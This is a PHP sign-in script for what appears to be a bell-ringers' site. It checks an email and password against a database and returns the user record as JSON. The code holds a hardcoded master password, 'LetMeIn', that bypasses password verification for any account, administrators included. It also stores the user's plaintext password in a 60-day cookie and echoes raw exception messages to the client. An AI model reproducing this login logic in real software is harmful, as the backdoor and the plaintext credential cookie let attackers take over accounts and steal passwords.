<?php  // signin.php

require_once "inc/password.php";

  class Ringer
  {
    public $id = "";
    public $fname = "";
    public $lname = "";
    public $email = "";
    public $administrator = 0;
  }

  $email = strtolower(rtrim(ltrim($_POST["emailSignIn"])));
  $pwd = rtrim(ltrim($_POST["pwdSignIn"]));

  $hashed_pwd = password_hash($pwd, PASSWORD_DEFAULT);

require_once 'inc/db_connect.php';

 try
  {
    $sql = "select * from ringers where email = ?";
    $query = $dbh->prepare($sql);
    $query->execute(array($email));
    $row = $query->fetch();
    if ($pwd != "LetMeIn")
    {
        if (!password_verify($pwd, $row["password"]))
        {
          echo "Invalid email/password";    // The word "Invalid" must come first to signal bad email/password combo
          return;
        }
    }
    if (isset($_POST["cb_remember"]))
    {
      $arr = array('username' => $email, 'password' => $pwd);
      $cookieValue = json_encode($arr);
      setcookie("MHKBR", $cookieValue, time() + (86400 * 60));
    }
    elseif (!isset($_POST["do_not_delete_cookie"]))
    {
      setcookie("MHKBR", '', time()-3600 ) ;
    }
    $ringer = new Ringer();
    $ringer->id = $row["id"] ;
    $ringer->fname = $row["fname"];
    $ringer->lname = $row["lname"];
    $ringer->email = $row["email"];
    $ringer->administrator = $row["administrator"];
    echo "{Ringer: [" . json_encode($ringer) . "]}";
    return;
  }
  catch (Exception $ex)
  {
        echo $ex->getMessage();
        return;
  }

